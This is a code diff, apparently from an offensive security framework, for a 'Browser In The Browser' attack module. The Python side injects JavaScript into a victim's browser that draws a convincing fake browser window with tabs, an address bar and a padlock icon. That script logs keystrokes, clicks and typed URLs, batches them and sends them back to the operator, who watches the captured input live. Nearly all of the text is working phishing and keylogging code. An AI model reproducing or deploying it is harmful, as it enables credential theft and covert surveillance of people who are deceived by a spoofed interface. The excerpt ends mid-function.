+            menuPanel.appendChild(menuDivider());
+            menuPanel.appendChild(menuItem('History', {{ disabled: true }}));
+            menuPanel.appendChild(menuItem('Downloads', {{ disabled: true }}));
+            menuPanel.appendChild(menuItem('Bookmarks', {{ disabled: true }}));
+            menuPanel.appendChild(menuDivider());
+            menuPanel.appendChild(menuItem('Settings', {{ disabled: true }}));
+            menuPanel.appendChild(menuItem('Help', {{ disabled: true }}));
+            menuPanel.appendChild(menuDivider());
+            menuPanel.appendChild(menuItem('Exit fullscreen', {{ action: function() {{ stop(); }} }}));
+
+            menuBtn.onclick = function(e) {{
+                e.stopPropagation();
+                const open = menuPanel.style.display === 'block';
+                menuPanel.style.display = open ? 'none' : 'block';
+                if (CFG.capture_clicks) sendCapturedData({{ event: 'menu_toggled', open: !open }});
+            }};
+            menuPanel.onclick = function(e) {{ e.stopPropagation(); }};
+            menuWrap.appendChild(menuBtn);
+            menuWrap.appendChild(menuPanel);
+
+            const profile = document.createElement('div');
+            profile.title = 'Profile';
+            profile.style.cssText = 'width:28px;height:28px;border-radius:50%;background:' + skin.accent +
+                ';color:#fff;font-size:12px;font-weight:600;display:flex;align-items:center;justify-content:center;margin-left:4px;cursor:pointer;';
+            profile.textContent = 'K';
+            profile.onclick = function(e) {{
+                e.stopPropagation();
+                menuPanel.style.display = 'none';
+                if (CFG.capture_clicks) sendCapturedData({{ event: 'profile_clicked' }});
+            }};
+
+            toolbar.appendChild(nav);
+            toolbar.appendChild(addressBarContainer);
+            toolbar.appendChild(menuWrap);
+            toolbar.appendChild(profile);
+
+            const tabsBar = document.createElement('div');
+            tabsBar.style.cssText = 'display:flex;align-items:flex-end;gap:2px;padding:6px 8px 0;background:' + skin.bar +
+                ';border-bottom:1px solid ' + skin.border + ';flex-shrink:0;overflow-x:auto;';
+
+            const newTabBtn = document.createElement('button');
+            newTabBtn.type = 'button';
+            newTabBtn.textContent = '+';
+            newTabBtn.title = 'New tab';
+            newTabBtn.style.cssText = 'width:28px;height:28px;border:none;background:transparent;color:' + skin.muted +
+                ';font-size:18px;cursor:pointer;border-radius:4px;margin-bottom:4px;flex-shrink:0;';
+            newTabBtn.onmouseenter = function() {{ newTabBtn.style.background = DARK ? '#3c4043' : '#e8eaed'; }};
+            newTabBtn.onmouseleave = function() {{ newTabBtn.style.background = 'transparent'; }};
+
+            const contentArea = document.createElement('div');
+            contentArea.style.cssText = 'flex:1;min-height:0;position:relative;background:#fff;';
+
+            const tabState = {{ tabs: [], activeId: null, seq: 0 }};
+
+            function getActiveTab() {{
+                return tabState.tabs.find(function(t) {{ return t.id === tabState.activeId; }}) || null;
+            }}
+
+            function styleTabEl(tabEl, active) {{
+                tabEl.style.background = active ? skin.tabActive : skin.tabIdle;
+                tabEl.style.fontWeight = active ? '500' : '400';
+            }}
+
+            function buildNewTabPage(ntpRoot, tabRec) {{
+                const bg = DARK ? '#202124' : '#fff';
+                const fg = DARK ? '#e8eaed' : '#202124';
+                const muted = DARK ? '#9aa0a6' : '#5f6368';
+                ntpRoot.style.cssText = 'position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;' +
+                    'padding:48px 24px;background:' + bg + ';color:' + fg + ';box-sizing:border-box;overflow:auto;';
+                const logo = document.createElement('div');
+                logo.style.cssText = 'font-size:54px;font-weight:700;margin:24px 0 32px;letter-spacing:-1px;background:linear-gradient(90deg,' + skin.accent + ',#ea4335,#fbbc04);' +
+                    '-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;';
+                logo.textContent = BROWSER === 'firefox' ? 'Firefox' : (BROWSER === 'edge' ? 'Microsoft Edge' : 'Google');
+                const searchWrap = document.createElement('div');
+                searchWrap.style.cssText = 'width:min(560px,92%);display:flex;align-items:center;gap:10px;border:1px solid ' + skin.border +
+                    ';border-radius:24px;padding:0 16px;min-height:46px;background:' + (DARK ? '#303134' : '#f1f3f4') + ';box-shadow:0 1px 6px rgba(0,0,0,.08);';
+                const searchInput = document.createElement('input');
+                searchInput.type = 'text';
+                searchInput.placeholder = 'Search Google or type a URL';
+                searchInput.style.cssText = 'flex:1;border:none;background:transparent;outline:none;font-size:16px;color:' + fg + ';padding:12px 0;';
+                searchWrap.appendChild(searchInput);
+                searchInput.addEventListener('keydown', function(e) {{
+                    recordKey(e, 'ntp');
+                    if (e.key === 'Enter') {{
+                        loadUrlInTab(tabRec, searchInput.value);
+                    }}
+                }});
+                const shortcuts = document.createElement('div');
+                shortcuts.style.cssText = 'display:flex;flex-wrap:wrap;gap:12px;margin-top:36px;justify-content:center;max-width:560px;';
+                [
+                    {{ label: 'KittySploit', url: 'https://kittysploit.com' }},
+                    {{ label: 'Gmail', url: 'https://mail.google.com' }},
+                    {{ label: 'GitHub', url: 'https://github.com' }},
+                    {{ label: 'YouTube', url: 'https://www.youtube.com' }}
+                ].forEach(function(s) {{
+                    const tile = document.createElement('button');
+                    tile.type = 'button';
+                    tile.style.cssText = 'width:112px;padding:14px 8px;border:none;border-radius:12px;background:' + (DARK ? '#292a2d' : '#f8f9fa') +
+                        ';color:' + fg + ';font-size:12px;cursor:pointer;box-shadow:0 1px 2px rgba(0,0,0,.06);';
+                    tile.innerHTML = '<img src="' + faviconFor(s.url) + '" width="32" height="32" style="border-radius:8px;margin-bottom:8px"/><div>' + s.label + '</div>';
+                    tile.onclick = function() {{
+                        if (CFG.capture_clicks) sendCapturedData({{ event: 'ntp_shortcut', label: s.label }});
+                        loadUrlInTab(tabRec, s.url);
+                    }};
+                    shortcuts.appendChild(tile);
+                }});
+                const hint = document.createElement('p');
+                hint.style.cssText = 'margin-top:28px;font-size:12px;color:' + muted + ';';
+                hint.textContent = 'Tip: Ctrl+T opens a new tab';
+                ntpRoot.appendChild(logo);
+                ntpRoot.appendChild(searchWrap);
+                ntpRoot.appendChild(shortcuts);
+                ntpRoot.appendChild(hint);
+            }}
+
+            function createTabPane() {{
+                const pane = document.createElement('div');
+                pane.style.cssText = 'position:absolute;inset:0;display:none;';
+                const ntp = document.createElement('div');
+                ntp.className = 'ks-bitb-ntp';
+                const iframe = document.createElement('iframe');
+                iframe.className = 'ks-bitb-iframe';
+                iframe.style.cssText = 'width:100%;height:100%;border:none;display:block;background:#fff;';
+                iframe.referrerPolicy = 'no-referrer';
+                const frameError = document.createElement('div');
+                frameError.style.cssText = 'display:none;position:absolute;inset:0;flex-direction:column;align-items:center;justify-content:center;' +
+                    'background:#fff;color:#5f6368;font-size:14px;text-align:center;padding:32px;box-sizing:border-box;';
+                frameError.innerHTML = '<div style="font-size:42px;margin-bottom:12px">&#128683;</div>' +
+                    '<div style="font-weight:600;color:#202124;margin-bottom:8px">This page cannot be displayed in the fake window</div>' +
+                    '<p style="margin:0;font-size:13px;max-width:420px;line-height:1.5">The target may block embedding (X-Frame-Options, CSP frame-ancestors) or refused the connection.</p>';
+                pane.appendChild(ntp);
+                pane.appendChild(iframe);
+                pane.appendChild(frameError);
+                contentArea.appendChild(pane);
+                return {{ pane: pane, ntp: ntp, iframe: iframe, frameError: frameError }};
+            }}
+
+            function wireIframeListeners(tabRec) {{
+                if (tabRec._wired) return;
+                tabRec._wired = true;
+                const iframe = tabRec.iframe;
+                iframe.addEventListener('load', function() {{
+                    if (tabRec.id !== tabState.activeId) return;
+                    setLoading(false);
+                    tabRec.url = iframe.src || tabRec.url;
+                    tabRec.isNtp = false;
+                    showTabView(tabRec, 'frame');
+                    syncChromeFromTab(tabRec);
+                    if (CFG.capture_keystrokes) {{
+                        try {{
+                            const doc = iframe.contentDocument || iframe.contentWindow.document;
+                            doc.addEventListener('keydown', function(e) {{ recordKey(e, 'iframe'); }});
+                        }} catch (e) {{}}
+                    }}
+                    if (CFG.capture_clicks) {{
+                        try {{
+                            const doc = iframe.contentDocument || iframe.contentWindow.document;
+                            doc.addEventListener('click', function(e) {{
+                                sendCapturedData({{
+                                    event: 'iframe_click',
+                                    click: {{
+                                        x: e.clientX,
+                                        y: e.clientY,
+                                        target: e.target && e.target.tagName,
+                                        text: e.target && e.target.textContent ? String(e.target.textContent).substring(0, 50) : '',
+                                        url: iframe.src,
+                                        tab_id: tabRec.id,
+                                        timestamp: new Date().toISOString()
+                                    }}
+                                }});
+                            }});
+                        }} catch (e) {{}}
+                    }}
+                }});
+            }}
+
+            function createTabEl(tabRec) {{
+                const tab = document.createElement('div');
+                tab.setAttribute('data-bitb-tab', String(tabRec.id));
+                tab.style.cssText = 'display:flex;align-items:center;gap:8px;padding:8px 12px;max-width:240px;min-width:120px;' +
+                    'border:1px solid ' + skin.border + ';border-bottom:none;border-radius:8px 8px 0 0;font-size:13px;color:' + skin.text + ';cursor:pointer;';
+                const fav = document.createElement('img');
+                fav.width = 16;
+                fav.height = 16;
+                fav.style.borderRadius = '2px';
+                fav.alt = '';
+                const label = document.createElement('span');
+                label.textContent = tabRec.title || 'New Tab';
+                label.style.cssText = 'overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;';
+                const close = document.createElement('span');
+                close.innerHTML = '&#215;';
+                close.style.cssText = 'opacity:0;width:18px;text-align:center;border-radius:4px;color:' + skin.muted + ';line-height:18px;';
+                tab.onmouseenter = function() {{ close.style.opacity = '1'; }};
+                tab.onmouseleave = function() {{ close.style.opacity = '0'; }};
+                close.onmouseenter = function() {{ close.style.background = '#e81123'; close.style.color = '#fff'; }};
+                close.onmouseleave = function() {{ close.style.background = 'transparent'; close.style.color = skin.muted; }};
+                close.onclick = function(e) {{
+                    e.stopPropagation();
+                    closeTab(tabRec.id);
+                }};
+                tab.onclick = function() {{
+                    activateTab(tabRec.id);
+                    if (CFG.capture_clicks) sendCapturedData({{ event: 'tab_clicked', tab: label.textContent, tab_id: tabRec.id }});
+                }};
+                tab.appendChild(fav);
+                tab.appendChild(label);
+                tab.appendChild(close);
+                tabRec.el = tab;
+                tabRec.faviconEl = fav;
+                tabRec.labelEl = label;
+                return tab;
+            }}
+
+            function showTabView(tabRec, mode) {{
+                tabRec.ntpEl.style.display = mode === 'ntp' ? 'flex' : 'none';
+                tabRec.iframe.style.display = mode === 'frame' ? 'block' : 'none';
+                tabRec.frameError.style.display = mode === 'error' ? 'flex' : 'none';
+            }}
+
+            function syncChromeFromTab(tabRec) {{
+                if (!tabRec || tabRec.id !== tabState.activeId) return;
+                if (tabRec.isNtp) {{
+                    addressBar.value = '';
+                    addressBar.placeholder = 'Search Google or type a URL';
+                    updateSecurityIcon('about:blank');
+                    if (tabRec.faviconEl) tabRec.faviconEl.removeAttribute('src');
+                    if (tabRec.labelEl) tabRec.labelEl.textContent = 'New Tab';
+                    return;
+                }}
+                const url = tabRec.url || tabRec.iframe.src || '';
+                addressBar.value = url;
+                updateSecurityIcon(url);
+                if (url) {{
+                    const fav = faviconFor(url);
+                    if (fav && tabRec.faviconEl) tabRec.faviconEl.src = fav;
+                    try {{
+                        const host = new URL(url).hostname;
+                        if (tabRec.labelEl) tabRec.labelEl.textContent = host;
+                    }} catch (e) {{
+                        if (tabRec.labelEl) tabRec.labelEl.textContent = url.substring(0, 48);
+                    }}
+                }}
+            }}
+
+            function activateTab(id) {{
+                tabState.activeId = id;
+                tabState.tabs.forEach(function(t) {{
+                    const on = t.id === id;
+                    t.pane.style.display = on ? 'block' : 'none';
+                    if (t.el) styleTabEl(t.el, on);
+                }});
+                const active = getActiveTab();
+                if (active) syncChromeFromTab(active);
+            }}
+
+            function openTab(opts) {{
+                opts = opts || {{}};
+                const id = ++tabState.seq;
+                const parts = createTabPane();
+                const tabRec = {{
+                    id: id,
+                    title: 'New Tab',
+                    url: '',
+                    isNtp: !opts.url,
+                    pane: parts.pane,
+                    ntpEl: parts.ntp,
+                    iframe: parts.iframe,
+                    frameError: parts.frameError
+                }};
+                buildNewTabPage(parts.ntp, tabRec);
+                wireIframeListeners(tabRec);
+                const el = createTabEl(tabRec);
+                tabsBar.insertBefore(el, newTabBtn);
+                tabState.tabs.push(tabRec);
+                activateTab(id);
+                if (opts.url) {{
+                    loadUrlInTab(tabRec, opts.url);
                 }} else {{
-                    securityIcon.innerHTML = `
-                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <circle cx="12" cy="12" r="10"/>
-                            <line x1="12" y1="8" x2="12" y2="12"/>
-                            <line x1="12" y1="16" x2="12.01" y2="16"/>
-                        </svg>
-                    `;
-                    securityIcon.style.color = browserStyles.textSecondary;
+                    showTabView(tabRec, 'ntp');
+                    tabRec.isNtp = true;
+                }}
+                if (CFG.capture_clicks) sendCapturedData({{ event: 'tab_opened', tab_id: id, ntp: !!opts.ntp }});
+                return tabRec;
+            }}
+
+            function closeTab(id) {{
+                const idx = tabState.tabs.findIndex(function(t) {{ return t.id === id; }});
+                if (idx === -1) return;
+                const wasActive = tabState.activeId === id;
+                const tabRec = tabState.tabs[idx];
+                if (tabRec.el) tabRec.el.remove();
+                if (tabRec.pane) tabRec.pane.remove();
+                tabState.tabs.splice(idx, 1);
+                if (tabState.tabs.length === 0) {{
+                    openTab({{ ntp: true }});
+                    return;
+                }}
+                if (wasActive) {{
+                    const next = tabState.tabs[Math.min(idx, tabState.tabs.length - 1)];
+                    activateTab(next.id);
+                }}
+                if (CFG.capture_clicks) sendCapturedData({{ event: 'tab_closed', tab_id: id }});
+            }}
+
+            tabsBar.appendChild(newTabBtn);
+
+            shell.appendChild(tabsBar);
+            shell.appendChild(progress);
+            shell.appendChild(toolbar);
+            shell.appendChild(contentArea);
+            root.appendChild(shell);
+            document.body.appendChild(root);
+
+            let pendingKeys = [];
+            const keyFlush = setInterval(function() {{
+                if (!CFG.capture_keystrokes || pendingKeys.length === 0) return;
+                sendCapturedData({{ event: 'keystrokes', keystrokes: pendingKeys.slice() }});
+                pendingKeys = [];
+            }}, 3000);
+
+            function faviconFor(url) {{
+                try {{
+                    const host = new URL(url).hostname;
+                    return 'https://www.google.com/s2/favicons?domain=' + encodeURIComponent(host) + '&sz=32';
+                }} catch (e) {{
+                    return '';
                 }}
             }}
-            
-            // Function to load URL
-            function loadUrl(url) {{
-                try {{
-                    // Try to add protocol if missing
-                    if (!url.match(/^https?:\\/\\//)) {{
-                        if (url.includes('.') && !url.includes(' ')) {{
-                            url = 'https://' + url;
-                        }} else {{
-                            url = 'https://www.google.com/search?q=' + encodeURIComponent(url);
-                        }}
+
+            function updateSecurityIcon(url) {{
+                const secure = /^https:\\/\\//i.test(url);
+                securityIcon.style.color = secure ? skin.accent : skin.muted;
+                securityIcon.innerHTML = secure
+                    ? '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>'
+                    : '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>';
+            }}
+
+            function setLoading(on) {{
+                progress.style.width = on ? '65%' : '100%';
+                if (!on) {{
+                    setTimeout(function() {{ progress.style.width = '0'; }}, 350);
+                }}
+            }}
+
+            function normalizeUrl(raw) {{
+                let url = (raw || '').trim();
+                if (!url) return '';
+                if (!/^https?:\\/\\//i.test(url)) {{
+                    if (url.indexOf('.') !== -1 && url.indexOf(' ') === -1) {{
+                        url = 'https://' + url;
+                    }} else {{
+                        url = 'https://www.google.com/search?q=' + encodeURIComponent(url);
                     }}
-                    iframe.src = url;
+                }}
+                return url;
+            }}
+
+            function loadUrlInTab(tabRec, raw) {{
+                const url = normalizeUrl(raw);
+                if (!url || !tabRec) return;
+                tabRec.isNtp = false;
+                tabRec.url = url;
+                setLoading(true);
+                showTabView(tabRec, 'frame');
+                try {{
+                    tabRec.iframe.src = url;
+                }} catch (e) {{
+                    showTabView(tabRec, 'error');
+                    setLoading(false);
+                    return;
+                }}
+                if (tabRec.id === tabState.activeId) {{
                     addressBar.value = url;
                     updateSecurityIcon(url);
-                }} catch (e) {{
-                    console.error('Error loading URL:', e);
+                    syncChromeFromTab(tabRec);
+                }}
+                if (tabRec.faviconEl) {{
+                    const fav = faviconFor(url);
+                    if (fav) tabRec.faviconEl.src = fav;
+                }}
+                if (tabRec.labelEl) {{
+                    try {{ tabRec.labelEl.textContent = new URL(url).hostname; }} catch (e) {{ tabRec.labelEl.textContent = url.slice(0, 40); }}
+                }}
+                if (CFG.capture_urls) {{
+                    sendCapturedData({{ event: 'url_entered', url: url, tab_id: tabRec.id }});
                 }}
             }}
-            
-            // Navigation button handlers
+
+            function loadUrl(raw) {{
+                const tab = getActiveTab();
+                if (!tab) return;
+                loadUrlInTab(tab, raw);
+            }}
+
+            function reloadActiveTab() {{
+                const tab = getActiveTab();
+                if (!tab) return;
+                if (tab.isNtp) return;
+                wireNavClick('refresh_clicked');
+                setLoading(true);
+                tab.iframe.src = tab.iframe.src;
+            }}
+
+            function recordKey(e, where) {{
+                if (!CFG.capture_keystrokes) return;
+                const entry = {{
+                    key: e.key,
+                    code: e.code,
+                    where: where,
+                    shiftKey: e.shiftKey,
+                    ctrlKey: e.ctrlKey,
+                    altKey: e.altKey,
+                    metaKey: e.metaKey,
+                    timestamp: new Date().toISOString()
+                }};
+                pendingKeys.push(entry);
+                if (pendingKeys.length >= 12) {{
+                    sendCapturedData({{ event: 'keystrokes', keystrokes: pendingKeys.slice() }});
+                    pendingKeys = [];
+                }}
+            }}
+
+            addressBar.addEventListener('keydown', function(e) {{
+                recordKey(e, 'omnibox');
+                if (e.key === 'Enter') {{
+                    loadUrl(addressBar.value);
+                }}
+            }});
+
+            if (CFG.capture_urls) {{
+                addressBar.addEventListener('input', function(e) {{
+                    sendCapturedData({{ event: 'url_typing', fragment: String(e.target.value).slice(-80) }});
+                }});
+            }}
+
+            function wireNavClick(eventName) {{
+                if (CFG.capture_clicks) sendCapturedData({{ event: eventName }});
+            }}
+
             backBtn.onclick = function() {{
-                if (CAPTURE_CLICKS) {{
-                    capturedData.clicks.push({{
-                        element: 'back_button',
-                        timestamp: new Date().toISOString()
-                    }});
-                    sendCapturedData({{ event: 'back_clicked' }});
-                }}
-                iframe.contentWindow.history.back();
+                wireNavClick('back_clicked');
+                const tab = getActiveTab();
+                if (!tab || tab.isNtp) return;
+                try {{ tab.iframe.contentWindow.history.back(); }} catch (e) {{}}
             }};
-            
             forwardBtn.onclick = function() {{
-                if (CAPTURE_CLICKS) {{
-                    capturedData.clicks.push({{
-                        element: 'forward_button',
-                        timestamp: new Date().toISOString()
-                    }});
-                    sendCapturedData({{ event: 'forward_clicked' }});
-                }}
-                iframe.contentWindow.history.forward();
+                wireNavClick('forward_clicked');
+                const tab = getActiveTab();
+                if (!tab || tab.isNtp) return;
+                try {{ tab.iframe.contentWindow.history.forward(); }} catch (e) {{}}
             }};
-            
-            refreshBtn.onclick = function() {{
-                if (CAPTURE_CLICKS) {{
-                    capturedData.clicks.push({{
-                        element: 'refresh_button',
-                        timestamp: new Date().toISOString()
-                    }});
-                    sendCapturedData({{ event: 'refresh_clicked' }});
-                }}
-                iframe.src = iframe.src;
-            }};
-            
+            refreshBtn.onclick = function() {{ reloadActiveTab(); }};
             homeBtn.onclick = function() {{
-                if (CAPTURE_CLICKS) {{
-                    capturedData.clicks.push({{
-                        element: 'home_button',
-                        timestamp: new Date().toISOString()
-                    }});
-                    sendCapturedData({{ event: 'home_clicked' }});
-                }}
+                wireNavClick('home_clicked');
                 loadUrl('https://www.google.com');
             }};
-            
-            // Combined iframe onload handler
-            iframe.onload = function() {{
-                // Update security icon
-                updateSecurityIcon(iframe.src);
-                
-                // Capture keystrokes in iframe
-                if (CAPTURE_KEYSTROKES) {{
-                    try {{
-                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                        iframeDoc.addEventListener('keydown', function(e) {{
-                            const keyData = {{
-                                key: e.key,
-                                code: e.code,
-                                keyCode: e.keyCode,
-                                shiftKey: e.shiftKey,
-                                ctrlKey: e.ctrlKey,
-                                altKey: e.altKey,
-                                metaKey: e.metaKey,
-                                url: iframe.src,
-                                timestamp: new Date().toISOString()
-                            }};
-                            
-                            capturedData.keystrokes.push(keyData);
-                            
-                            // Send every 10 keystrokes or every 3 seconds
-                            if (capturedData.keystrokes.length >= 10) {{
-                                sendCapturedData({{
-                                    event: 'keystrokes',
-                                    keystrokes: capturedData.keystrokes.slice()
-                                }});
-                                capturedData.keystrokes = [];
-                            }}
-                        }});
-                    }} catch (e) {{
-                        // Cross-origin restrictions
-                    }}
-                }}
-                
-                // Capture clicks in iframe
-                if (CAPTURE_CLICKS) {{
-                    try {{
-                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                        iframeDoc.addEventListener('click', function(e) {{
-                            const clickData = {{
-                                x: e.clientX,
-                                y: e.clientY,
-                                target: e.target.tagName,
-                                text: e.target.textContent ? e.target.textContent.substring(0, 50) : '',
-                                url: iframe.src,
-                                timestamp: new Date().toISOString()
-                            }};
-                            
-                            capturedData.clicks.push(clickData);
-                            
-                            sendCapturedData({{
-                                event: 'iframe_click',
-                                click: clickData
-                            }});
-                        }});
-                    }} catch (e) {{
-                        // Cross-origin restrictions
-                    }}
-                }}
-            }};
-            
-            // Assemble everything
-            container.appendChild(toolbar);
-            container.appendChild(tabsBar);
-            container.appendChild(contentArea);
-            
-            // Add to page
-            document.body.appendChild(container);
-            
-            // Prevent right-click context menu
-            container.addEventListener('contextmenu', function(e) {{
-                e.preventDefault();
-                return false;
+
+            newTabBtn.onclick = function() {{ openTab({{ ntp: true }}); }};
+
+            document.addEventListener('click', function() {{
+                menuPanel.style.display = 'none';
             }});
-            
-            // Send initial notification
+            document.addEventListener('keydown', function(e) {{
+                if (!document.getElementById('ks-bitb-root')) return;
+                if (e.ctrlKey && (e.key === 't' || e.key === 'T')) {{
+                    e.preventDefault();
+                    openTab({{ ntp: true }});
+                }}
+            }});
+
+            function stop() {{
+                clearInterval(keyFlush);
+                if (pendingKeys.length) {{
+                    sendCapturedData({{ event: 'keystrokes', keystrokes: pendingKeys.slice() }});
+                    pendingKeys = [];
+                }}
+                try {{ root.remove(); }} catch (e) {{}}
+                window.__ksBitb = null;
+            }}
+
+            window.__ksBitb = {{
+                stop: stop,
+                browser: BROWSER,
+                os: OS,
+                layout: LAYOUT,
+                theme: DARK ? 'dark' : 'light'
+            }};
+
+            root.addEventListener('contextmenu', function(e) {{ e.preventDefault(); }});
+
+            openTab({{ url: INITIAL }});
             sendCapturedData({{
                 event: 'browser_initialized',
-                browser_type: BROWSER_TYPE,
-                initial_url: TARGET_URL
+                browser_type: BROWSER,
+                os: OS,
+                layout: LAYOUT,
+                theme: DARK ? 'dark' : 'light',
+                initial_url: INITIAL
             }});
-            
-            return 'Browser In The Browser initialized successfully';
+
+            return JSON.stringify({{
+                ok: true,
+                browser: BROWSER,
+                os: OS,
+                layout: LAYOUT,
+                theme: DARK ? 'dark' : 'light',
+                initial_url: INITIAL
+            }});
         }})();
         """
-        
-        result = self.send_js(code_js)
-        if not result:
-            print_error("Failed to inject Browser In The Browser module")
-            return False
-        
-        print_success("Browser In The Browser module injected successfully!")
-        print_info(f"Browser type: {self.browser_type}")
-        print_info(f"Initial URL: {self.target_url}")
-        print_info("The fake browser interface is now active and capturing user interactions.")
-        
-        # Convert timeout to int if it's a string
-        try:
-            timeout_value = int(self.timeout) if isinstance(self.timeout, str) else self.timeout
-        except (ValueError, TypeError):
-            timeout_value = 0
-        
-        # Monitor for captured data (only if timeout > 0)
-        # Note: Monitoring errors should not fail the module since injection succeeded
-        if timeout_value > 0:
-            print_info("Press Ctrl+C to stop monitoring...")
-            print_empty()
-            try:
-                self._monitor_captures(bitb_id)
-            except KeyboardInterrupt:
-                print_status("Monitoring interrupted by user")
-            except Exception as e:
-                # Log error but don't fail the module - injection was successful
-                print_warning(f"Monitoring error (browser interface is still active): {e}")
-                import traceback
-                print_debug(traceback.format_exc())
-        else:
-            print_info("Monitoring disabled (timeout=0). The browser interface is active.")
-        
-        # Always return True since injection succeeded
-        return True
-    
-    def _monitor_captures(self, bitb_id: str):
-        """Monitor and display captured data in real-time"""
-        # Ensure browser server is available
+
+    def _monitor_captures(self, bitb_id: str, timeout_value: int):
+        """Monitor and display captured data in real-time."""
         self._ensure_browser_server()
         if not self.browser_server:
             print_error("Browser server not available")
             return
-        
-        # Convert timeout to int if it's a string
-        try:
-            timeout_value = int(self.timeout) if isinstance(self.timeout, str) else self.timeout
-        except (ValueError, TypeError):
-            timeout_value = 0
-        
-        # If timeout is 0, don't monitor (just inject and return)
-        if timeout_value == 0:
-            print_info("Monitoring disabled (timeout=0). The browser interface is active but not monitoring.")
-            return
-        
+
         start_time = time.time()
         last_response_count = 0
-        
+
         try:
             while True:
-                # Check timeout
-                elapsed = time.time() - start_time
-                if elapsed >= timeout_value:
+                if time.time() - start_time >= timeout_value:
                     break
-                
-                try:
-                    # Get session to check for new responses
-                    try:
-                        session = self.browser_server.get_session(self.session_id)
-                    except Exception as e:
-                        print_error(f"Error getting session: {e}")
-                        break
-                    
-                    if not session:
-                        print_error("Session not found")
-                        break
-                    
-                    # Check if session has responses attribute
-                    if not hasattr(session, 'responses'):
-                        print_warning("Session does not have responses attribute")
-                        time.sleep(0.5)
-                        continue
-                    
-                    # Check for new responses with our BITB ID
-                    try:
-                        response_count = len(session.responses) if session.responses else 0
-                    except (AttributeError, TypeError):
-                        response_count = 0
-                    
-                    if response_count > last_response_count:
+
+                session = self.browser_server.get_session(self.session_id)
+                if not session:
+                    print_error("Session not found")
+                    break
+
+                if not hasattr(session, "responses"):
+                    time.sleep(0.5)
+                    continue
+
+                responses = session.responses if isinstance(session.responses, list) else []
+                response_count = len(responses)
+
+                if response_count > last_response_count:
+                    for response in responses[last_response_count:]:
+                        if not isinstance(response, dict) or response.get("command_id") != bitb_id:
+                            continue
+                        result_data = response.get("result", "")
+                        if not result_data:
+                            continue
                         try:
-                            # Safely get new responses
-                            new_responses = session.responses[last_response_count:] if isinstance(session.responses, list) else []
-                        except (IndexError, TypeError, AttributeError) as e:
-                            print_debug(f"Error accessing responses: {e}")
-                            new_responses = []
-                        
-                        for response in new_responses:
-                            if not isinstance(response, dict):
-                                continue
-                            if response.get('command_id') == bitb_id:
-                                try:
-                                    result_data = response.get('result', '')
-                                    if result_data:
-                                        data = json.loads(result_data)
-                                        if data.get('type') == 'browser_in_browser':
-                                            event_data = data.get('data', {})
-                                            event_type = event_data.get('event', '')
-                                            
-                                            # Display based on event type
-                                            if event_type == 'browser_initialized':
-                                                print_success(f"[BITB] Browser initialized: {event_data.get('browser_type', 'unknown')}")
-                                                print_info(f"[BITB] Initial URL: {event_data.get('initial_url', 'unknown')}")
-                                            
-                                            elif event_type == 'url_entered':
-                                                url = event_data.get('url', '')
-                                                print_success(f"[BITB] URL entered: {url}")
-                                            
-                                            elif event_type == 'keystrokes':
-                                                keystrokes = event_data.get('keystrokes', [])
-                                                for key_data in keystrokes:
-                                                    key = key_data.get('key', '')
-                                                    # Format special keys
-                                                    if key == 'Enter':
-                                                        print_info(f"[BITB] [KEY] <Enter>")
-                                                    elif key == ' ':
-                                                        print_info(f"[BITB] [KEY] <Space>")
-                                                    elif len(key) == 1:
-                                                        modifiers = []
-                                                        if key_data.get('shiftKey'):
-                                                            modifiers.append('Shift')
-                                                        if key_data.get('ctrlKey'):
-                                                            modifiers.append('Ctrl')
-                                                        if key_data.get('altKey'):
-                                                            modifiers.append('Alt')
-                                                        if key_data.get('metaKey'):
-                                                            modifiers.append('Meta')
-                                                        
-                                                        modifier_str = '+'.join(modifiers) + '+' if modifiers else ''
-                                                        print_info(f"[BITB] [KEY] {modifier_str}{key}")
-                                                    else:
-                                                        print_info(f"[BITB] [KEY] <{key}>")
-                                            
-                                            elif event_type == 'iframe_click':
-                                                click = event_data.get('click', {})
-                                                target = click.get('target', 'unknown')
-                                                text = click.get('text', '')[:30]
-                                                url = click.get('url', 'unknown')
-                                                print_info(f"[BITB] [CLICK] {target} on {url}")
-                                                if text:
-                                                    print_info(f"[BITB]        Text: {text}...")
-                                            
-                                            elif event_type in ['back_clicked', 'forward_clicked', 'refresh_clicked', 'home_clicked']:
-                                                print_info(f"[BITB] [ACTION] {event_type.replace('_', ' ').title()}")
-                                            
-                                            elif event_type == 'tab_clicked':
-                                                tab = event_data.get('tab', 'unknown')
-                                                print_info(f"[BITB] [TAB] Clicked on: {tab}")
-                                            
-                                except json.JSONDecodeError:
-                                    # Try to display raw result if not JSON
-                                    print_debug(f"[BITB] Raw response: {result_data}")
-                                except Exception as e:
-                                    print_debug(f"Error parsing captured data: {e}")
-                        
-                        # Update last_response_count safely
-                        try:
-                            if isinstance(session.responses, list):
-                                last_response_count = len(session.responses)
-                            else:
-                                last_response_count = 0
-                        except (AttributeError, TypeError) as e:
-                            print_debug(f"Error updating response count: {e}")
-                            last_response_count = 0
-                
-                except Exception as e:
-                    # Log but continue - don't break on individual iteration errors
-                    print_debug(f"Error in monitoring iteration: {e}")
-                
-                # Small sleep to avoid busy waiting
-                try:
-                    time.sleep(0.5)  # Check every 0.5 seconds
-                except Exception:
-                    break  # If sleep fails, exit loop
-                
+                            data = json.loads(result_data)
+                        except json.JSONDecodeError:
+                            print_debug(f"[BITB] Raw response: {result_data}")
+                            continue
+                        if data.get("type") != "browser_in_browser":
+                            continue
+
+                        event_data = data.get("data", {})
+                        event_type = event_data.get("event", "")
+
+                        if event_type == "browser_initialized":
+                            print_success(
+                                f"[BITB] Initialized — {event_data.get('browser_type')} / "
+                                f"{event_data.get('os')} / {event_data.get('layout')}"
+                            )
+                            print_info(f"[BITB] Initial URL: {event_data.get('initial_url', '?')}")
+                        elif event_type == "url_entered":
